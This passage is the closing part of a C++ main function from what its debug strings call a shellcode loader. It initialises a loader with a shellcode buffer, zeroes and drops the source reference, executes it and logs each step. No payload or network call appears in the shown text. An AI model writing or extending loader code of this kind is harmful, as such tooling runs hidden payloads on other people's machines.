    if (!ldr.Init(sc, SHELLCODE_SIZE)) {
        DBG("Init FAILED");
        SysFree((PVOID*)&sc, SHELLCODE_SIZE, true);
        CloseDbg();
        return -3;
    }
    DBG("Init OK");
    
    // Init zeros the source, cleanup our reference
    sc = nullptr;
    
    DBG("Calling Execute()");
    if (!ldr.Execute()) { DBG("Execute FAILED"); CloseDbg(); return -4; }
    DBG("Execute OK");
    
    DBG("=== LOADER COMPLETE ===");
    CloseDbg();
    return 0;
}
